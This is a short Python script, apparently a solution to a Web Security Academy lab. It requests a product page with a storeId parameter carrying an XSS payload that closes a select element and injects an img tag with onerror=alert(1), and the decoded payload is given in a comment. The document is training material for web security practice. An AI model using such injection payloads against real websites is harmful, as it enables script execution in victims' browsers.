import requests

url = "https://0a4000e4037fb18cc33ee3bd000f0021.web-security-academy.net/product?productId=10&storeId=%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E"
solution = requests.get(url)
print(solution.content)

##explain: at request GET product, add storeID param to hit script (viewsources to see)
##Payload: &storeId="></select><img src=1 onerror=alert(1)>